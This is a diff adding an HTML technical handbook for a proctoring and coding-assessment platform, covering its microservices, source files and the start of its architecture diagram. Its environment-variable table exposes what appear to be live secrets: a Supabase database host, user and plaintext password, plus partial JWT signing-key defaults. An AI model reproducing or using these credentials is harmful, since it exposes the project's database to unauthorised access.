@@ -1,0 +1,3405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>System Monitoring — Master Technical Documentation</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    mermaid.initialize({ 
+      startOnLoad: true, 
+      theme: 'default',
+      themeVariables: {
+        primaryColor: '#e0e7ff',
+        primaryTextColor: '#1e1b4b',
+        primaryBorderColor: '#6366f1',
+        lineColor: '#4f46e5',
+        secondaryColor: '#f1f5f9',
+        tertiaryColor: '#ffffff'
+      }
+    });
+  </script>
+  <style>
+    @page {
+      size: A4;
+      margin: 16mm 14mm 16mm 14mm;
+    }
+
+    * {
+      box-sizing: border-box;
+      -webkit-print-color-adjust: exact !important;
+      print-color-adjust: exact !important;
+    }
+
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      line-height: 1.65;
+      color: #1e293b;
+      background-color: #ffffff;
+      padding: 30px;
+      max-width: 960px;
+      margin: 0 auto;
+      font-size: 13.5px;
+    }
+
+    /* Cover Page Header */
+    .cover-banner {
+      background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #312e81 100%);
+      color: #ffffff;
+      padding: 36px 32px;
+      border-radius: 12px;
+      margin-bottom: 35px;
+      box-shadow: 0 10px 25px -5px rgba(15, 23, 42, 0.2);
+    }
+    .cover-banner h1 {
+      color: #ffffff !important;
+      border: none !important;
+      margin: 0 0 10px 0 !important;
+      font-size: 28px !important;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    .cover-banner .subtitle {
+      font-size: 16px;
+      color: #c7d2fe;
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+    .badge-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .badge {
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      color: #f8fafc;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 11.5px;
+      font-weight: 600;
+    }
+
+    h1, h2, h3, h4, h5, h6 {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      font-weight: 700;
+      color: #0f172a;
+      page-break-after: avoid;
+    }
+
+    h1 {
+      font-size: 22px;
+      color: #1e3a8a;
+      border-bottom: 2px solid #3b82f6;
+      padding-bottom: 8px;
+      margin-top: 2.2em;
+      margin-bottom: 0.8em;
+      page-break-before: auto;
+    }
+
+    /* First h1 on page */
+    body > h1:first-of-type {
+      display: none; /* Replaced by cover banner */
+    }
+    body > h2:first-of-type {
+      display: none;
+    }
+
+    h2 {
+      font-size: 17px;
+      color: #2563eb;
+      border-bottom: 1px solid #e2e8f0;
+      padding-bottom: 6px;
+      margin-top: 1.8em;
+      margin-bottom: 0.6em;
+    }
+
+    h3 {
+      font-size: 15px;
+      color: #334155;
+      margin-top: 1.4em;
+    }
+
+    h4 {
+      font-size: 13.5px;
+      color: #475569;
+    }
+
+    p, ul, ol {
+      margin-bottom: 0.85em;
+    }
+
+    li {
+      margin-bottom: 0.3em;
+    }
+
+    blockquote {
+      margin: 1.2em 0;
+      padding: 12px 18px;
+      background-color: #f8fafc;
+      border-left: 4px solid #3b82f6;
+      border-radius: 6px;
+      color: #334155;
+      font-size: 13.5px;
+    }
+
+    blockquote p {
+      margin: 0;
+    }
+
+    code {
+      font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
+      font-size: 11.5px;
+      background-color: #f1f5f9;
+      padding: 2px 5px;
+      border-radius: 4px;
+      color: #d97706;
+      border: 1px solid #e2e8f0;
+    }
+
+    pre {
+      background-color: #0f172a !important;
+      color: #f8fafc !important;
+      padding: 14px 16px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-size: 11.5px;
+      line-height: 1.5;
+      page-break-inside: avoid;
+      margin: 1.2em 0;
+      border: 1px solid #1e293b;
+    }
+
+    pre code {
+      background: none !important;
+      color: #f1f5f9 !important;
+      padding: 0 !important;
+      border: none !important;
+      font-size: 11.5px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.4em 0;
+      font-size: 12px;
+      page-break-inside: avoid;
+    }
+
+    th, td {
+      border: 1px solid #cbd5e1;
+      padding: 7px 10px;
+      text-align: left;
+      vertical-align: top;
+    }
+
+    th {
+      background-color: #f1f5f9 !important;
+      color: #0f172a;
+      font-weight: 700;
+    }
+
+    tr:nth-child(even) {
+      background-color: #f8fafc !important;
+    }
+
+    hr {
+      border: none;
+      height: 1px;
+      background: #e2e8f0;
+      margin: 2em 0;
+    }
+
+    .mermaid {
+      background-color: #ffffff;
+      padding: 16px;
+      border-radius: 8px;
+      margin: 1.5em 0;
+      display: flex;
+      justify-content: center;
+      page-break-inside: avoid;
+      border: 1px solid #e2e8f0;
+    }
+
+    .mermaid svg {
+      max-width: 100% !important;
+      height: auto !important;
+    }
+
+    @media print {
+      body {
+        padding: 0;
+        max-width: 100%;
+      }
+      .cover-banner {
+        box-shadow: none;
+      }
+      h1 {
+        page-break-before: auto;
+      }
+      table, pre, blockquote, .mermaid {
+        page-break-inside: avoid;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="cover-banner">
+    <h1>System Monitoring — Master Technical Handbook</h1>
+    <div class="subtitle">Complete End-to-End Deep Architectural & Technical Analysis (30 Sections)</div>
+    <div class="badge-row">
+      <span class="badge">Go / Gin Microservices</span>
+      <span class="badge">Python FastAPI & YOLOv8</span>
+      <span class="badge">React + TypeScript</span>
+      <span class="badge">PostgreSQL & Supabase</span>
+      <span class="badge">WebSockets & WebRTC</span>
+      <span class="badge">Interview Q&A Guide</span>
+    </div>
+  </div>
+
+  <h1>SYSTEM MONITORING — MASTER TECHNICAL DOCUMENTATION</h1>
+<h2>Complete End-to-End Deep Technical Analysis</h2>
+<blockquote>
+<p><strong>Project</strong>: AI-Powered Secure Coding Assessment &amp; Proctoring Platform<br><strong>Codename</strong>: CodeShield / System Monitoring<br><strong>Analysis Date</strong>: September 2026<br><strong>Codebase Location</strong>: <code>c:\Users\Hp\OneDrive\Documents\GitHub\System-monitoring-</code></p>
+</blockquote>
+<hr>
+<h1>TABLE OF CONTENTS</h1>
+<ol>
+<li><a href="#1-complete-project-inventory">Complete Project Inventory</a></li>
+<li><a href="#2-complete-system-architecture">Complete System Architecture</a></li>
+<li><a href="#3-frontend--complete-technical-breakdown">Frontend — Complete Technical Breakdown</a></li>
+<li><a href="#4-backend--complete-internal-architecture">Backend — Complete Internal Architecture</a></li>
+<li><a href="#5-database--complete-deep-dive">Database — Complete Deep Dive</a></li>
+<li><a href="#6-authentication--authorization">Authentication &amp; Authorization</a></li>
+<li><a href="#7-secure-coding-assessment-system">Secure Coding Assessment System</a></li>
+<li><a href="#8-anti-cheating--security-monitoring">Anti-Cheating / Security Monitoring</a></li>
+<li><a href="#9-ai--computer-vision">AI / Computer Vision — Extremely Deep Explanation</a></li>
+<li><a href="#10-real-time-communication">Real-Time Communication</a></li>
+<li><a href="#11-malpractice-detection-pipeline">Malpractice Detection Pipeline</a></li>
+<li><a href="#12-email-notification-system">Email Notification System</a></li>
+<li><a href="#13-supabase">Supabase</a></li>
+<li><a href="#14-performance-engineering">Performance Engineering</a></li>
+<li><a href="#15-security-engineering">Security Engineering</a></li>
+<li><a href="#16-deployment--devops">Deployment &amp; DevOps</a></li>
+<li><a href="#17-error-handling">Error Handling</a></li>
+<li><a href="#18-complete-end-to-end-user-flows">Complete End-to-End User Flows</a></li>
+<li><a href="#19-file-by-file-technical-mapping">File-by-File Technical Mapping</a></li>
+<li><a href="#20-dependency-analysis">Dependency Analysis</a></li>
+<li><a href="#21-data-flow--data-contracts">Data Flow &amp; Data Contracts</a></li>
+<li><a href="#22-technical-decision-analysis">Technical Decision Analysis</a></li>
+<li><a href="#23-implemented-vs-proposed">Implemented vs Proposed</a></li>
+<li><a href="#24-technical-limitations">Technical Limitations</a></li>
+<li><a href="#25-scalability">Scalability</a></li>
+<li><a href="#26-technical-jury--interview-questions">Technical Jury / Interview Questions</a></li>
+<li><a href="#27-why-did-you-build-it-this-way">&quot;Why Did You Build It This Way?&quot; Questions</a></li>
+<li><a href="#28-complete-terminology-glossary">Complete Terminology Glossary</a></li>
+<li><a href="#29-final-architecture-diagram">Final Architecture Diagram</a></li>
+<li><a href="#30-explanations">30-Second / 1-Minute / 3-Minute Explanations</a></li>
+</ol>
+<hr>
+<h1>1. COMPLETE PROJECT INVENTORY</h1>
+<h2>1.1 High-Level Directory Structure</h2>
+<pre><code>System-monitoring-/
+├── frontend/               ← React + TypeScript + Vite SPA (Candidate &amp; Admin UI)
+├── backend-auth/           ← Go + Gin primary REST API (Auth, Compiler, Timer, Malpractice)
+├── Anticheating/           ← Go + Gin secondary microservice (Session monitoring, heartbeat)
+├── yolo-proctor/           ← Python + FastAPI + YOLOv8 WebSocket server (Object detection AI)
+├── render.yaml             ← Render.com multi-service deployment manifest
+├── vercel.json             ← Vercel frontend deployment configuration
+├── start-dev.bat           ← Windows batch script to launch all 4 services
+├── yolov8n.pt              ← YOLOv8 Nano pre-trained model weights (6.5 MB)
+├── pyrightconfig.json      ← Python type-checking config
+└── .gitignore              ← Git exclusion rules
+</code></pre>
+<h2>1.2 The Four Microservices</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Service</th>
+<th>Language</th>
+<th>Port</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><strong>backend-auth</strong></td>
+<td>Go (Gin)</td>
+<td>8080</td>
+<td>Primary API: Auth, Compiler, Problems, Timer, Malpractice, Email</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>Anticheating</strong></td>
+<td>Go (Gin)</td>
+<td>8081</td>
+<td>Secondary API: Session monitoring, heartbeat, offline detection</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>yolo-proctor</strong></td>
+<td>Python (FastAPI)</td>
+<td>8082</td>
+<td>AI: YOLOv8 object detection via WebSocket</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>frontend</strong></td>
+<td>TypeScript (React/Vite)</td>
+<td>5173</td>
+<td>SPA: Candidate exam UI, Admin dashboard, AI camera widget</td>
+</tr>
+</tbody></table>
+<h2>1.3 Every Source File in <code>backend-auth/</code></h2>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Lines</th>
+<th>Responsibility</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/main.go">main.go</a></td>
+<td>70</td>
+<td>Application entry point; wires all dependencies via constructor injection</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/config/config.go">config/config.go</a></td>
+<td>126</td>
+<td>Loads all env vars into a typed <code>Config</code> struct; custom <code>.env</code> parser</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/config/database.go">config/database.go</a></td>
+<td>201</td>
+<td>PostgreSQL/SQLite init with triple fallback; auto-migration; seed data</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/models/models.go">models/models.go</a></td>
+<td>383</td>
+<td>All GORM models and DTOs: Admin, User, ExamSession, Problem, TestCase, Submission, Leaderboard, MalpracticeLog</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/models/timer.go">models/timer.go</a></td>
+<td>99</td>
+<td>ExamTimer model with <code>GetRemainingSeconds()</code> calculation and <code>ToResponse()</code></td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/routes/routes.go">routes/routes.go</a></td>
+<td>123</td>
+<td>All API route registration with Gin; groups: auth, admin, exam, compiler, monitoring, leaderboard</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/middleware/auth.go">middleware/auth.go</a></td>
+<td>146</td>
+<td>Three JWT middleware functions: <code>RequireAuth</code> (user), <code>RequireAdmin</code>, <code>RequireAnyAuth</code></td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/middleware/logging.go">middleware/logging.go</a></td>
+<td>42</td>
+<td>Request logger middleware; CORS middleware with wildcard <code>*</code> origin</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/auth_controller.go">controllers/auth_controller.go</a></td>
+<td>126</td>
+<td>Handlers: Register, Login, Logout, AdminRegister, AdminLogin</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/compiler_controller.go">controllers/compiler_controller.go</a></td>
+<td>113</td>
+<td>Handlers: RunCode, SubmitCode; integrates leaderboard updates</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/exam_controller.go">controllers/exam_controller.go</a></td>
+<td>~70</td>
+<td>Handlers: StartExam, GetStatus, EndExam</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/malpractice_controller.go">controllers/malpractice_controller.go</a></td>
+<td>84</td>
+<td>Handlers: LogMalpractice, GetUserMalpractices, GetAllMalpractices</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/timer_controller.go">controllers/timer_controller.go</a></td>
+<td>126</td>
+<td>Handlers: GetTimerStatus, VerifyExamPassword, ConfigTimer, StartTimer, PauseTimer, ResumeTimer, ExtendTimer, EndTimer</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/problem_controller.go">controllers/problem_controller.go</a></td>
+<td>~70</td>
+<td>Handlers: GetAllProblems, GetProblemByID, CreateProblem</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/leaderboard_controller.go">controllers/leaderboard_controller.go</a></td>
+<td>~40</td>
+<td>Handler: GetLeaderboard</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/controllers/user_controller.go">controllers/user_controller.go</a></td>
+<td>~55</td>
+<td>Handlers: GetProfile, UpdateProfile</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/auth_service.go">services/auth_service.go</a></td>
+<td>201</td>
+<td>Business logic: Register, AuthenticateUser, RegisterAdmin, AuthenticateAdmin, ValidateToken, generateToken</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/compiler_service.go">services/compiler_service.go</a></td>
+<td>502</td>
+<td>Code execution engine: Go, Python, JavaScript/TS, Java, C++, Rust via <code>os/exec</code></td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/email_service.go">services/email_service.go</a></td>
+<td>239</td>
+<td>Resend API email sender; builds professional HTML alert emails</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/malpractice_service.go">services/malpractice_service.go</a></td>
+<td>99</td>
+<td>Violation logging with auto-lookup of candidate info; async email dispatch</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/timer_service.go">services/timer_service.go</a></td>
+<td>198</td>
+<td>Central exam timer: configure, start, pause, resume, extend, end, verify password</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/exam_service.go">services/exam_service.go</a></td>
+<td>128</td>
+<td>Exam session lifecycle: start, get status, end, auto-expire</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/leaderboard_service.go">services/leaderboard_service.go</a></td>
+<td>95</td>
+<td>Leaderboard ranking and upsert logic</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/problem_service.go">services/problem_service.go</a></td>
+<td>115</td>
+<td>Problem CRUD with test case management</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/user_service.go">services/user_service.go</a></td>
+<td>64</td>
+<td>Profile get and update (protects email/password from modification)</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/repositories">repositories/*.go</a></td>
+<td>8 files</td>
+<td>GORM database operation wrappers for each model</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/pkg/utils/utils.go">pkg/utils/utils.go</a></td>
+<td>57</td>
+<td>Standardized JSON response helpers: Success, Error, BadRequest, Unauthorized, Forbidden, NotFound, InternalError, Conflict</td>
+</tr>
+</tbody></table>
+<h2>1.4 Every Source File in <code>frontend/src/</code></h2>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Size</th>
+<th>Responsibility</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/main.tsx">main.tsx</a></td>
+<td>246B</td>
+<td>React DOM entry; renders <code>&lt;App/&gt;</code> in StrictMode</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/App.tsx">App.tsx</a></td>
+<td>2.5KB</td>
+<td>Root component; BrowserRouter, providers (Auth→Monitoring→Exam), theme switching</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/api/client.ts">api/client.ts</a></td>
+<td>59KB</td>
+<td><strong>Massive</strong> unified API layer: real backend calls with localStorage offline fallbacks</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/contexts/AuthContext.tsx">contexts/AuthContext.tsx</a></td>
+<td>3.2KB</td>
+<td>Auth state: user profile, login/register/logout, token rehydration</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/contexts/ExamContext.tsx">contexts/ExamContext.tsx</a></td>
+<td>8.2KB</td>
+<td>Exam state: problems, code editor map, timer sync (1.5s polling), run/submit</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/contexts/MonitoringContext.tsx">contexts/MonitoringContext.tsx</a></td>
+<td>10KB</td>
+<td>Security monitoring state: confidence score, risk, violations, fullscreen, keyboard lock, copy/paste protection</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/hooks/useAntiCheating.ts">hooks/useAntiCheating.ts</a></td>
+<td>10.5KB</td>
+<td>18+ browser event listeners: context menu, clipboard, keydown, fullscreen, visibility, blur/focus, drag, scroll, DevTools</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/hooks/useCopyPasteProtection.ts">hooks/useCopyPasteProtection.ts</a></td>
+<td>7.9KB</td>
+<td>Deep clipboard/selection/drag prevention with CSS <code>user-select:none</code> injection</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/routes/AppRoutes.tsx">routes/AppRoutes.tsx</a></td>
+<td>2.7KB</td>
+<td>React Router v7 route definitions; <code>AdminOnly</code> guard component</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/types/index.ts">types/index.ts</a></td>
+<td>3.8KB</td>
+<td>All TypeScript interfaces: UserProfile, ProblemData, MonitoringEvent, CompilerResult, LeaderboardEntry, etc.</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/services/mockData.ts">services/mockData.ts</a></td>
+<td>12.9KB</td>
+<td>Seed data: candidate cards, problems with starter code, monitoring events, leaderboard</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/monitoring/AICameraWidget.tsx">components/monitoring/AICameraWidget.tsx</a></td>
+<td>30KB</td>
+<td><strong>Core AI component</strong>: webcam stream, COCO-SSD in-browser detection, MediaPipe FaceMesh, YOLO WebSocket, canvas overlay</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/compiler/MonacoWrapper.tsx">components/compiler/MonacoWrapper.tsx</a></td>
+<td>4.4KB</td>
+<td>Monaco Editor integration with language switching</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/compiler/ConsoleOutput.tsx">components/compiler/ConsoleOutput.tsx</a></td>
+<td>11.2KB</td>
+<td>Console output panel with test case results</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/compiler/ProblemDescription.tsx">components/compiler/ProblemDescription.tsx</a></td>
+<td>5.1KB</td>
+<td>Problem statement display</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/dashboard">components/dashboard/*.tsx</a></td>
+<td>7 files</td>
+<td>Admin components: AdminTimerControl, CreateProblemModal, LiveCandidateCard, CandidateDetailModal, StatCard, ActivityChart, AdminManagementPanel</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/monitoring">components/monitoring/*.tsx</a></td>
+<td>6 files</td>
+<td>Monitoring overlays: ExamPasswordGateModal, FullscreenOverlay, LockScreenOverlay, SecurityViolationModal, SuspiciousTimeline</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/pages/Auth">pages/Auth/*.tsx</a></td>
+<td>4 files</td>
+<td>CandidateLogin, CandidateRegister, AdminLogin, AdminRegister</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/pages/Admin/AdminDashboard.tsx">pages/Admin/AdminDashboard.tsx</a></td>
+<td>13.7KB</td>
+<td>Admin dashboard with timer control, live candidates, malpractice logs</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/pages/Candidate">pages/Candidate/*.tsx</a></td>
+<td>5 files</td>
+<td>CandidateDashboard, AssessmentsPage, ProblemsPage, ResultsPage, AssessmentReadinessPage</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/pages/Compiler/ExamPage.tsx">pages/Compiler/ExamPage.tsx</a></td>
+<td>10KB</td>
+<td>Main exam page: Monaco Editor + AI Camera + Timer + Problem panel</td>
+</tr>
+<tr>
+<td><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/pages/Compiler/SandboxPage.tsx">pages/Compiler/SandboxPage.tsx</a></td>
+<td>7.7KB</td>
+<td>Practice/sandbox coding environment</td>
+</tr>
+</tbody></table>
+<h2>1.5 Every Environment Variable</h2>
+<table>
+<thead>
+<tr>
+<th>Variable</th>
+<th>Default</th>
+<th>Where Used</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SERVER_PORT</code> / <code>PORT</code></td>
+<td><code>8080</code></td>
+<td>backend-auth</td>
+<td>HTTP server listen port</td>
+</tr>
+<tr>
+<td><code>APP_ENV</code></td>
+<td><code>development</code></td>
+<td>backend-auth</td>
+<td>Controls Gin mode (release vs debug)</td>
+</tr>
+<tr>
+<td><code>DB_HOST</code></td>
+<td><code>aws-1-ap-south-1.pooler.supabase.com</code></td>
+<td>backend-auth</td>
+<td>PostgreSQL host (Supabase pooler)</td>
+</tr>
+<tr>
+<td><code>DB_PORT</code></td>
+<td><code>5432</code></td>
+<td>backend-auth</td>
+<td>PostgreSQL port</td>
+</tr>
+<tr>
+<td><code>DB_USER</code></td>
+<td><code>postgres.wdtshwffstjzfclwsqox</code></td>
+<td>backend-auth</td>
+<td>Supabase DB user</td>
+</tr>
+<tr>
+<td><code>DB_PASSWORD</code></td>
+<td><code>Kishores%402029</code></td>
+<td>backend-auth</td>
+<td>DB password (URL-encoded <code>@</code>)</td>
+</tr>
+<tr>
+<td><code>DB_NAME</code></td>
+<td><code>postgres</code></td>
+<td>backend-auth</td>
+<td>Database name</td>
+</tr>
+<tr>
+<td><code>DB_SSLMODE</code></td>
+<td><code>require</code></td>
+<td>backend-auth</td>
+<td>TLS mode for Postgres connection</td>
+</tr>
+<tr>
+<td><code>JWT_SECRET</code></td>
+<td><code>codeshield-user-secret-key-...</code></td>
+<td>backend-auth</td>
+<td>HMAC key for user JWT signing</td>
+</tr>
+<tr>
+<td><code>JWT_EXPIRY_HOURS</code></td>
+<td><code>24</code></td>
+<td>backend-auth</td>
+<td>User token lifetime</td>
+</tr>
+<tr>
+<td><code>ADMIN_JWT_SECRET</code></td>
+<td><code>codeshield-admin-secret-key-...</code></td>
+<td>backend-auth</td>
+<td>HMAC key for admin JWT</td>
+</tr>
+<tr>
+<td><code>ADMIN_JWT_EXPIRY_HOURS</code></td>
+<td><code>12</code></td>
+<td>backend-auth</td>
+<td>Admin token lifetime</td>
+</tr>
+<tr>
+<td><code>COMPILER_TIMEOUT_SECONDS</code></td>
+<td><code>5</code></td>
+<td>backend-auth</td>
+<td>Max code execution time</td>
+</tr>
+<tr>
+<td><code>MAX_CODE_SIZE_KB</code></td>
+<td><code>100</code></td>
+<td>backend-auth</td>
+<td>Max code submission size (102,400 bytes)</td>
+</tr>
+<tr>
+<td><code>TEMP_DIR</code></td>
+<td>OS temp</td>
+<td>backend-auth</td>
+<td>Directory for code compilation temp files</td>
+</tr>
+<tr>
+<td><code>RESEND_API_KEY</code></td>
+<td><em>(empty)</em></td>
+<td>backend-auth</td>
+<td>Resend email API key</td>
+</tr>
+<tr>
+<td><code>MAIL_FROM</code></td>
+<td><code>onboarding@resend.dev</code></td>
+<td>backend-auth</td>
+<td>Email sender address</td>
+</tr>
+<tr>
+<td><code>VITE_API_BASE</code></td>
+<td>auto-detect</td>
+<td>frontend</td>
+<td>Backend API URL</td>
+</tr>
+<tr>
+<td><code>VITE_ANTICHEATING_API_BASE</code></td>
+<td>auto-detect</td>
+<td>frontend</td>
+<td>Anticheating service URL</td>
+</tr>
+<tr>
+<td><code>VITE_YOLO_WS_URL</code></td>
+<td>auto-detect</td>
+<td>frontend</td>
+<td>YOLO WebSocket URL</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>2. COMPLETE SYSTEM ARCHITECTURE</h1>
+<div class="mermaid">graph TB
+    subgraph "CLIENT BROWSER"
+        REACT["React SPA<br/>(Vite + TypeScript)"]
+        MONACO["Monaco Editor"]
+        COCO["COCO-SSD<br/>(TensorFlow.js)"]
+        MEDIAPIPE["MediaPipe<br/>FaceMesh"]
+        WEBCAM["Webcam<br/>MediaStream"]
+        ANTICHEATHOOK["useAntiCheating<br/>Hook"]
+    end
+
+<pre><code>subgraph &quot;BACKEND SERVICES&quot;
+    GOAUTH[&quot;backend-auth&lt;br/&gt;Go + Gin&lt;br/&gt;Port 8080&quot;]
+    GOANTICHEATING[&quot;Anticheating&lt;br/&gt;Go + Gin&lt;br/&gt;Port 8081&quot;]
+    YOLO[&quot;yolo-proctor&lt;br/&gt;Python + FastAPI&lt;br/&gt;Port 8082&quot;]
+end
+
+subgraph &quot;DATA LAYER&quot;
+    SUPABASE[&quot;Supabase PostgreSQL&lt;br/&gt;(Production)&quot;]
+    SQLITE[&quot;SQLite&lt;br/&gt;(Dev Fallback)&quot;]
+end
+
+subgraph &quot;EXTERNAL SERVICES&quot;
+    RESEND[&quot;Resend Email API&quot;]
+    VERCEL[&quot;Vercel&lt;br/&gt;(Frontend CDN)&quot;]
+    RENDER[&quot;Render.com&lt;br/&gt;(Backend Hosting)&quot;]
+end
+
+REACT --&gt;|&quot;REST/JSON&lt;br/&gt;Bearer JWT&quot;| GOAUTH
+REACT --&gt;|&quot;REST/JSON&quot;| GOANTICHEATING
+WEBCAM --&gt;|&quot;Base64 frames&quot;| YOLO
